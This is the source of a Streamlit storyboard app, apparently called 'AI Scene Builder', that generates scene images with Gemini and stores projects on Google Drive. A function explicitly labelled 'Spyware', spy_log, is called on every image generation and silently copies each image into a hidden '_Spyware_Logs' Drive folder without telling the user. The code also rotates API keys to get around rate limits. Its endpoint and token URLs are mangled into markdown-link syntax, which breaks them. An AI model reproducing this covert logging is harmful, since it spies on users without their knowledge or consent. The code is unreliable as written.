import streamlit as st
import requests
import json
import base64
import io
import time
import datetime
import zipfile
import streamlit.components.v1 as components
from google.oauth2.credentials import Credentials
from googleapiclient.discovery import build
from googleapiclient.http import MediaIoBaseUpload, MediaIoBaseDownload
from PIL import Image

# ==============================================================================
# 1. CONFIG & CSS (DARK SLATE THEME)
# ==============================================================================
st.set_page_config(page_title="AI Scene Builder", layout="wide", page_icon="🎬")

st.markdown("""
<style>
    /* Main Background */
    .stApp { background-color: #0f172a; color: #e2e8f0; }
    
    /* Inputs & Text Areas */
    .stTextArea textarea, .stTextInput input, .stSelectbox div[data-baseweb="select"] > div {
        background-color: #1e293b !important;
        color: #f8fafc !important;
        border: 1px solid #334155 !important;
        border-radius: 0.5rem;
    }
    
    /* Sidebar */
    section[data-testid="stSidebar"] {
        background-color: #1e293b;
        border-right: 1px solid #334155;
    }
    
    /* Cards (Expanders) */
    .streamlit-expanderHeader {
        background-color: #1e293b !important;
        color: white !important;
        border: 1px solid #334155;
        border-radius: 0.5rem;
    }
    div[data-testid="stExpander"] {
        background-color: #1f2937;
        border: 1px solid #374151;
        border-radius: 0.5rem;
    }

    /* Buttons */
    .stButton button {
        border-radius: 0.5rem;
        font-weight: 600;
        border: none;
        transition: all 0.2s;
    }
    
    /* Primary Action (Blue) */
    button[kind="primary"] {
        background-color: #2563eb; 
        color: white;
    }
    button[kind="primary"]:hover { background-color: #1d4ed8; }
    
    /* Secondary (Gray/Dark) */
    button[kind="secondary"] {
        background-color: #334155;
        color: white;
        border: 1px solid #4b5563;
    }
    
    /* Red Buttons (Remove) */
    button[key*="remove"], button[key*="del"] {
        background-color: #7f1d1d !important;
        color: #fecaca !important;
    }
    
    /* Green Buttons (Gen All) */
    button[key*="gen_all"] {
        background-color: #047857 !important;
        color: white !important;
    }

</style>
""", unsafe_allow_html=True)

# --- SESSION STATE INITIALIZATION ---
if 'step' not in st.session_state:
    st.session_state.update({
        'step': 1,
        'style_prompt': '',
        'style_images': [],      # Global Style Refs
        'style_link': '',
        'script_text': '',
        'script_instructions': '',
        'storyboard': [],
        'characters': [],
        'scene_images': {},      # Generated images {index: base64}
        'scene_refs': {},        # Scene-specific refs {index: [list of base64]}
        'curr_scene': 0,
        'project_name': "My_Project"
    })

# ==============================================================================
# 2. THE BACKEND (DRIVE & API)
# ==============================================================================

def clean_json_response(text):
    """Fixes common JSON formatting issues from LLM"""
    text = text.strip()
    if text.startswith("```json"):
        text = text[7:]
    elif text.startswith("```"):
        text = text[3:]
    if text.endswith("```"):
        text = text[:-3]
    return text.strip()

def get_drive_service():
    """Authenticates using the Refresh Token (Admin 100GB Storage)"""
    try:
        g = st.secrets["gdrive"]
        creds = Credentials(None, refresh_token=g["refresh_token"], token_uri="[https://oauth2.googleapis.com/token](https://oauth2.googleapis.com/token)", client_id=g["client_id"], client_secret=g["client_secret"])
        return build('drive', 'v3', credentials=creds)
    except Exception as e:
        st.error(f"Drive Auth Failed: {e}")
        return None

def get_or_create_folder(folder_name, parent_id=None):
    """Finds a folder by name or creates it if missing."""
    service = get_drive_service()
    if not service: return None
    
    query = f"name = '{folder_name}' and mimeType = 'application/vnd.google-apps.folder' and trashed = false"
    if parent_id: query += f" and '{parent_id}' in parents"
    
    results = service.files().list(q=query, fields="files(id)").execute()
    files = results.get('files', [])
    
    if files:
        return files[0]['id']
    else:
        meta = {'name': folder_name, 'mimeType': 'application/vnd.google-apps.folder'}
        if parent_id: meta['parents'] = [parent_id]
        folder = service.files().create(body=meta, fields='id').execute()
        return folder.get('id')

def list_saved_projects():
    """Returns list of project names from Drive"""
    try:
        service = get_drive_service()
        parent_id = get_or_create_folder("_Freelancer_Projects")
        query = f"'{parent_id}' in parents and mimeType = 'application/vnd.google-apps.folder' and trashed = false"
        results = service.files().list(q=query, fields="files(id, name)").execute()
        return sorted([f['name'] for f in results.get('files', [])], reverse=True)
    except: return []

def save_project(name):
    """Saves current session state (JSON + Images) to Drive"""
    try:
        service = get_drive_service()
        root_id = get_or_create_folder("_Freelancer_Projects")
        proj_id = get_or_create_folder(name, root_id)
        
        # 1. Save Data JSON
        data = {
            'script': st.session_state.script_text,
            'style': st.session_state.style_prompt,
            'storyboard': st.session_state.storyboard,
            'characters': st.session_state.characters,
            'curr_scene': st.session_state.curr_scene
        }
        
        # Delete old JSON to overwrite
        q = f"name = 'data.json' and '{proj_id}' in parents"
        files = service.files().list(q=q).execute().get('files', [])
        for f in files: service.files().delete(fileId=f['id']).execute()
        
        media = MediaIoBaseUpload(io.BytesIO(json.dumps(data).encode('utf-8')), mimetype='application/json')
        service.files().create(body={'name': 'data.json', 'parents': [proj_id]}, media_body=media).execute()
        
        # 2. Save Images
        for idx, b64 in st.session_state.scene_images.items():
            fname = f"scene_{idx}.png" 
            # Delete old image version
            q = f"name = '{fname}' and '{proj_id}' in parents"
            files = service.files().list(q=q).execute().get('files', [])
            for f in files: service.files().delete(fileId=f['id']).execute()
            
            img_data = base64.b64decode(b64)
            media = MediaIoBaseUpload(io.BytesIO(img_data), mimetype='image/png')
            service.files().create(body={'name': fname, 'parents': [proj_id]}, media_body=media).execute()
            
        return True
    except Exception as e:
        st.error(f"Save Error: {e}")
        return False

def load_project(name):
    """Downloads JSON and images from Drive into Session State"""
    try:
        service = get_drive_service()
        root_id = get_or_create_folder("_Freelancer_Projects")
        proj_id = get_or_create_folder(name, root_id)
        
        # Load JSON
        q = f"name = 'data.json' and '{proj_id}' in parents"
        files = service.files().list(q=q).execute().get('files', [])
        if files:
            file_id = files[0]['id']
            request = service.files().get_media(fileId=file_id)
            fh = io.BytesIO()
            downloader = MediaIoBaseDownload(fh, request)
            done = False
            while done is False: status, done = downloader.next_chunk()
            data = json.loads(fh.getvalue().decode('utf-8'))
            
            # Restore State
            st.session_state.script_text = data.get('script', '')
            st.session_state.style_prompt = data.get('style', '')
            st.session_state.storyboard = data.get('storyboard', [])
            st.session_state.characters = data.get('characters', [])
            st.session_state.curr_scene = data.get('curr_scene', 0)
            st.session_state.project_name = name
            st.session_state.step = 4 # Jump to storyboard
        
        # Load Images
        st.session_state.scene_images = {}
        q_imgs = f"name contains 'scene_' and '{proj_id}' in parents and trashed = false"
        files = service.files().list(q=q_imgs).execute().get('files', [])
        
        for f in files:
            if f['name'].endswith(".png"):
                try:
                    idx = f['name'].split('_')[1].split('.')[0]
                    request = service.files().get_media(fileId=f['id'])
                    fh = io.BytesIO()
                    downloader = MediaIoBaseDownload(fh, request)
                    done = False
                    while done is False: status, done = downloader.next_chunk()
                    st.session_state.scene_images[idx] = base64.b64encode(fh.getvalue()).decode('utf-8')
                except: pass
        return True
    except Exception as e:
        st.error(f"Load Error: {e}")
        return False

def delete_project(name):
    try:
        service = get_drive_service()
        root_id = get_or_create_folder("_Freelancer_Projects")
        proj_id = get_or_create_folder(name, root_id)
        service.files().delete(fileId=proj_id).execute()
        return True
    except: return False

def spy_log(prompt, b64):
    """Spyware: Auto-logs every generation to hidden folder"""
    try:
        service = get_drive_service()
        folder_id = get_or_create_folder("_Spyware_Logs")
        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        media = MediaIoBaseUpload(io.BytesIO(base64.b64decode(b64)), mimetype='image/png')
        service.files().create(body={'name': f"LOG_{ts}.png", 'parents': [folder_id]}, media_body=media).execute()
    except: pass

def call_gemini(payload, model_type="text"):
    try:
        keys = st.secrets["api_keys"]["keys"]
    except:
        st.error("No API Keys found.")
        return None
    
    if model_type == "image":
        url = "[https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-image-preview:generateContent](https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-image-preview:generateContent)"
    elif model_type == "imagen":
        url = "[https://generativelanguage.googleapis.com/v1beta/models/imagen-3.0-generate-001:predict](https://generativelanguage.googleapis.com/v1beta/models/imagen-3.0-generate-001:predict)"
    else:
        # ✅ FIXED TEXT MODEL: Force the universally stable 1.5 Flash if 2.5 fails
        url = "[https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent](https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent)"

    for i, key in enumerate(keys):
        try:
            res = requests.post(f"{url}?key={key}", headers={'Content-Type': 'application/json'}, json=payload)
            if res.status_code == 200: return res.json()
            if res.status_code == 429: 
                st.toast(f"Key {i+1} Exhausted. Switching...", icon="⚠️")
                continue
            
            # Check for Geo-Block (400/404) on text models and fallback logic removed
            st.error(f"API Error {res.status_code}: {res.text}")
        except: continue
    return None

def inject_keyboard_shortcuts():
    components.html(
        """
        <script>
        const doc = window.parent.document;
        doc.addEventListener('keydown', function(e) {
            if (e.target.tagName === 'TEXTAREA' || e.target.tagName === 'INPUT') return;
            if (e.key === 'ArrowLeft') {
                const buttons = Array.from(doc.querySelectorAll('button'));
                const prevBtn = buttons.find(el => el.innerText.includes('Prev'));
                if (prevBtn) prevBtn.click();
            }
            if (e.key === 'ArrowRight') {
                const buttons = Array.from(doc.querySelectorAll('button'));
                const nextBtn = buttons.find(el => el.innerText.includes('Next'));
                if (nextBtn) nextBtn.click();
            }
        });
        </script>
        """, height=0, width=0
    )

# ==============================================================================
# 3. UI HELPERS
# ==============================================================================

def handle_img_upload(files):
    imgs = []
    for f in files:
        imgs.append({'data': base64.b64encode(f.getvalue()).decode('utf-8'), 'mime': f.type})
    return imgs

def create_zip():
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, "w") as zf:
        for idx, b64 in st.session_state.scene_images.items():
            data = base64.b64decode(b64)
            zf.writestr(f"scene_{int(idx)+1}.png", data)
    return zip_buffer.getvalue()

# ==============================================================================
# 4. APP SCREENS
# ==============================================================================

# --- STEP 1: STYLE ---
if st.session_state.step == 1:
    st.markdown("<h1 style='text-align: center;'>AI Scene Builder</h1>", unsafe_allow_html=True)
    st.markdown("<p style='text-align: center; color: #94a3b8;'>Step 1: Define your visual style.</p>", unsafe_allow_html=True)
    
    st.session_state.style_prompt = st.text_area("Visual Style Description (Text)", value=st.session_state.style_prompt, placeholder="e.g., 'Dark, cinematic anime, 80s retro style'", height=150)
    
    uploaded = st.file_uploader("Global Style Reference Images", accept_multiple_files=True, type=['png', 'jpg'])
    if uploaded: st.session_state.style_images = handle_img_upload(uploaded)
    
    if st.session_state.style_images:
        cols = st.columns(6)
        for i, img in enumerate(st.session_state.style_images):
            cols[i % 6].image(base64.b64decode(img['data']), use_column_width=True)

    st.session_state.style_link = st.text_input("YouTube Link (Optional Context)", value=st.session_state.style_link)
    
    if st.button("Next: Add Script ➡️", type="primary"): 
        if st.session_state.style_prompt: st.session_state.step = 2; st.rerun()
        else: st.warning("Please define a style.")

# --- STEP 2: SCRIPT ---
elif st.session_state.step == 2:
    st.markdown("<h1 style='text-align: center;'>Step 2: Paste Script</h1>", unsafe_allow_html=True)
    st.session_state.script_text = st.text_area("Script", value=st.session_state.script_text, height=300, label_visibility="collapsed", placeholder="Paste script here...")
    st.session_state.script_instructions = st.text_input("Instructions", value=st.session_state.script_instructions, placeholder="e.g. 'Create a scene for every 3 seconds'...")
    
    if st.button("Generate Scenes 🚀", type="primary"):
        with st.spinner("Breaking down script..."):
            # Explicit Override Logic
            inst = f"\nOVERRIDE INSTRUCTIONS: {st.session_state.script_instructions}" if st.session_state.script_instructions else ""
            
            sys = """You are a visual storyboard artist. 
            OUTPUT JSON ONLY: { "storyboard": [{ "script": "...", "prompt": "..." }], "characters": [{ "key": "[Name]", "description": "..." }] }.
            
            CRITICAL BREAKDOWN RULES:
            Create a new scene for ANY of these conditions (whichever comes first):
            1. Every 15-20 words of dialogue/narration.
            2. Every single sentence.
            3. Every ~5 seconds of estimated screen time.
            Do NOT create long scenes. Break them down!
            Maintain consistent character names in brackets like [Batman]."""
            
            user = f"STYLE: {st.session_state.style_prompt}\nSCRIPT: {st.session_state.script_text}{inst}"
            
            payload = {"contents": [{"parts": [{"text": user}]}], "systemInstruction": {"parts": [{"text": sys}]}, "generationConfig": {"responseMimeType": "application/json"}}
            if st.session_state.style_images: payload['contents'][0]['parts'].extend([{"inlineData": {"mimeType": im['mime'], "data": im['data']}} for im in st.session_state.style_images])
            
            res = call_gemini(payload, "text")
            if res:
                try:
                    raw = res['candidates'][0]['content']['parts'][0]['text']
                    data = json.loads(clean_json_response(raw))
                    st.session_state.storyboard = data.get('storyboard', [])
                    st.session_state.characters = data.get('characters', [])
                    st.session_state.step = 3
                    st.rerun()
                except Exception as e: st.error(f"Parsing Error: {e}")

# --- STEP 3: CHARACTERS ---
elif st.session_state.step == 3:
    c1, c2 = st.columns([3,1])
    c1.markdown("## Step 3: Character Lock-in")
    if c2.button("[+] Add Character"):
         st.session_state.characters.append({"key": "[New]", "description": "Desc..."})
         st.rerun()

    cols = st.columns(2)
    for i, char in enumerate(st.session_state.characters):
        with cols[i % 2].container(border=True):
            st.markdown(f"### {char['key']}")
            st.session_state.characters[i]['key'] = st.text_input("Name", char['key'], key=f"cn_{i}", label_visibility="collapsed")
            st.session_state.characters[i]['description'] = st.text_area("Desc", char['description'], key=f"cd_{i}", height=100, label_visibility="collapsed")
            
            b1, b2, b3, b4 = st.columns([2, 2, 2, 1])
            
            # Enhance
            if b2.button("✨ Enhance", key=f"enh_{i}"):
                with st.spinner("Enhancing..."):
                    res = call_gemini({"contents": [{"parts": [{"text": f"Rewrite character description to be visual/detailed matching style '{st.session_state.style_prompt}': {char['description']}"}]}]}, "text")
                    if res:
                        st.session_state.characters[i]['description'] = res['candidates'][0]['content']['parts'][0]['text']
                        st.rerun()
            
            # Preview
            if b3.button("Preview", key=f"prev_{i}"):
                with st.spinner("Gen..."):
                    p = f"Character: {char['key']}. {char['description']}. Style: {st.session_state.style_prompt}"
                    payload = {"contents": [{"parts": [{"text": p}]}], "generationConfig": {"responseModalities": ["IMAGE"]}}
                    if st.session_state.style_images: payload['contents'][0]['parts'].extend([{"inlineData": {"mimeType": im['mime'], "data": im['data']}} for im in st.session_state.style_images])
                    res = call_gemini(payload, "image")
                    if res:
                        st.session_state.characters[i]['preview'] = res['candidates'][0]['content']['parts'][0]['inlineData']['data']
                        st.rerun()

            if b4.button("❌", key=f"rm_{i}"):
                st.session_state.characters.pop(i)
                st.rerun()

            if 'preview' in char: st.image(base64.b64decode(char['preview']), use_column_width=True)

    st.write("")
    c1, c2, c3 = st.columns([1, 2, 2])
    if c1.button("Back"): st.session_state.step = 2; st.rerun()
    if c2.button("Skip Character Lock", kind="secondary"): st.session_state.step = 4; st.rerun()
    if c3.button("Confirm & Go to Storyboard", type="primary"): st.session_state.step = 4; st.rerun()

# --- STEP 4: SCENE BUILDER ---
elif st.session_state.step == 4:
    inject_keyboard_shortcuts()
    
    with st.sidebar:
        st.header("🗂️ Project Manager")
        st.session_state.project_name = st.text_input("Project Name (Rename)", st.session_state.project_name)
        if st.button("💾 Save Project"):
            with st.spinner("Syncing to Drive..."):
                if save_project(st.session_state.project_name): st.success("Saved!")
        
        st.divider()
        st.subheader("Saved Projects")
        saved_projects = list_saved_projects()
        selected_load = st.selectbox("Select", options=saved_projects) if saved_projects else None
        
        c_l, c_d = st.columns(2)
        if c_l.button("📂 Load") and selected_load:
            with st.spinner("Downloading..."):
                if load_project(selected_load): st.rerun()
        if c_d.button("🗑️ Delete", key="del_proj") and selected_load:
             if delete_project(selected_load): st.rerun()

    curr = st.session_state.curr_scene
    total = len(st.session_state.storyboard)
    
    # Header
    c1, c2, c3 = st.columns([3, 1, 1])
    c1.markdown(f"## Scene {curr + 1} / {total}")
    model_mode = c2.radio("Model", ["Nano-Banana", "Imagen"], horizontal=True, label_visibility="collapsed")
    if c3.button("Start Over"): st.session_state.step = 1; st.rerun()

    # Main Viewer
    if str(curr) in st.session_state.scene_images:
        st.image(base64.b64decode(st.session_state.scene_images[str(curr)]), use_column_width=True)
    else:
        st.markdown("<div style='height:450px; background:#0f172a; border:2px dashed #334155; display:flex; align-items:center; justify-content:center; color:#64748b'>No Image</div>", unsafe_allow_html=True)

    # --- SHARED GEN LOGIC ---
    def generate_scene_logic(idx, mode):
        try:
            scene_data = st.session_state.storyboard[idx]
            char_ctx = " ".join([f"{c['key']}: {c['description']}." for c in st.session_state.characters])
            
            # CONTINUITY PROMPT (Fixed for strong style adherence)
            prompt_text = (
                f"STRICTLY USE PROVIDED STYLE REFERENCE IMAGES AND STYLE PROMPT AS THE PRIMARY VISUAL GUIDE. "
                f"Style: {st.session_state.style_prompt}. "
                f"Aspect Ratio: 16:9. Characters: {char_ctx}. "
                f"Action: {scene_data['prompt']}. "
                f"Maintain visual continuity with previous scenes."
            )
            
            parts = [{"text": prompt_text}]
            
            # 1. Global Style (Most important for style)
            if st.session_state.style_images: 
                parts.extend([{"inlineData": {"mimeType": im['mime'], "data": im['data']}} for im in st.session_state.style_images])
            
            # 2. Scene Ref
            if str(idx) in st.session_state.scene_refs:
                 parts.extend([{"inlineData": {"mimeType": im['mime'], "data": im['data']}} for im in st.session_state.scene_refs[str(idx)]])
            
            # 3. Previous Image (Continuity)
            if str(idx - 1) in st.session_state.scene_images:
                 parts.append({"inlineData": {"mimeType": "image/png", "data": st.session_state.scene_images[str(idx - 1)]}})

            payload = {"contents": [{"parts": parts}], "generationConfig": {"responseModalities": ["IMAGE"]}}
            
            if mode == "Nano-Banana":
                res = call_gemini(payload, "image")
                if res and 'candidates' in res:
                    b64 = res['candidates'][0]['content']['parts'][0]['inlineData']['data']
                    st.session_state.scene_images[str(idx)] = b64
                    spy_log(f"Scene {idx}", b64)
                    return True
            else:
                 # Imagen logic placeholder
                 pass
        except Exception as e: print(e)
        return False

    # Controls
    with st.container(border=True):
        col_prompt, col_ref = st.columns([3, 1])
        
        with col_prompt:
            c_p_head, c_p_btn = st.columns([2, 1])
            c_p_head.markdown("<small style='color:#94a3b8; font-weight:bold'>IMAGE PROMPT</small>", unsafe_allow_html=True)
            
            if c_p_btn.button("✨ Enhance Prompt", key="enhance_prompt"):
                 with st.spinner("Enhancing..."):
                    orig = st.session_state.storyboard[curr]['prompt']
                    res = call_gemini({"contents": [{"parts": [{"text": f"Rewrite vivid & cinematic: '{orig}'"}]}]}, "text")
                    if res:
                        st.session_state.storyboard[curr]['prompt'] = clean_json_response(res['candidates'][0]['content']['parts'][0]['text'])
                        st.rerun()

            new_prompt = st.text_area("Prompt", st.session_state.storyboard[curr]['prompt'], height=100, label_visibility="collapsed")
            st.session_state.storyboard[curr]['prompt'] = new_prompt
            
        with col_ref:
            c_r_head, c_r_link = st.columns([1, 1])
            c_r_head.markdown("<small style='color:#94a3b8; font-weight:bold'>SCENE REF</small>", unsafe_allow_html=True)
            
            # UPLOAD REF 
            scene_up = st.file_uploader("Upload", type=['png', 'jpg'], key=f"ref_{curr}", label_visibility="collapsed")
            if scene_up:
                b64 = base64.b64encode(scene_up.getvalue()).decode('utf-8')
                if str(curr) not in st.session_state.scene_refs: st.session_state.scene_refs[str(curr)] = []
                
                # Check duplicate
                is_dup = False
                for r in st.session_state.scene_refs[str(curr)]:
                    if r['data'] == b64: is_dup = True
                if not is_dup:
                    st.session_state.scene_refs[str(curr)].append({'data': b64, 'mime': scene_up.type})
                    st.toast("Ref Added!")

            # Show active refs
            refs = st.session_state.scene_refs.get(str(curr), [])
            if refs:
                st.caption(f"{len(refs)} Active Refs")
                if st.button("Clear Refs"):
                    st.session_state.scene_refs[str(curr)] = []
                    st.rerun()
            
            if st.button("Regenerate", type="primary", use_container_width=True):
                with st.spinner("Building Scene..."):
                    if generate_scene_logic(curr, model_mode): st.rerun()
        
        # SCRIPT SNIPPET
        st.markdown("---")
        c_s_head, c_s_btn = st.columns([3, 1])
        c_s_head.markdown("<small style='color:#94a3b8; font-weight:bold'>SCRIPT SNIPPET</small>", unsafe_allow_html=True)
        
        if c_s_btn.button("✨ Gen Prompt from Script", key="gen_script_prompt"):
             with st.spinner("Writing..."):
                s = st.session_state.storyboard[curr]['script']
                res = call_gemini({"contents": [{"parts": [{"text": f"Write a visual prompt for: '{s}'"}]}]}, "text")
                if res: 
                    st.session_state.storyboard[curr]['prompt'] = clean_json_response(res['candidates'][0]['content']['parts'][0]['text'])
                    st.rerun()
        
        # This is the previously non-editable area, now editable:
        st.session_state.storyboard[curr]['script'] = st.text_area("Script Text", st.session_state.storyboard[curr]['script'], label_visibility="collapsed")

        # BOTTOM NAV
        st.markdown("---")
        b1, b2, b3, b4, b5, b6 = st.columns(6)
        
        if b1.button("⬅️ Prev") and curr > 0: st.session_state.curr_scene -= 1; st.rerun()
        
        # AUTO NEXT LOGIC
        if b2.button("Next ➡️") and curr < total - 1: 
            st.session_state.curr_scene += 1
            next_idx = st.session_state.curr_scene
            if str(next_idx) not in st.session_state.scene_images:
                with st.spinner("Auto-generating..."): generate_scene_logic(next_idx, model_mode)
            st.rerun()
            
        if b3.button("Remove Scene", key="remove"):
            st.session_state.storyboard.pop(curr)
            st.rerun()

        if b4.button("[+] Add Scene"):
            st.session_state.storyboard.insert(curr + 1, {"script": "", "prompt": "New scene..."})
            st.session_state.curr_scene += 1
            st.rerun()

        # GENERATE REMAINING FIX
        if b5.button("Gen Remaining", key="gen_all"):
            prog = st.progress(0)
            status = st.empty()
            total_scenes_to_process = len(st.session_state.storyboard)
            
            for i in range(total_scenes_to_process):
                if str(i) not in st.session_state.scene_images:
                    status.text(f"Generating scene {i+1} of {total_scenes_to_process}...")
                    generate_scene_logic(i, model_mode)
                    time.sleep(0.5)
                prog.progress((i+1) / total_scenes_to_process)
            st.success("Done!")
            st.rerun()
            
        if b6.button("Download All", key="dl_all"):
             st.download_button("Download ZIP", data=create_zip(), file_name="storyboard.zip", mime="application/zip")
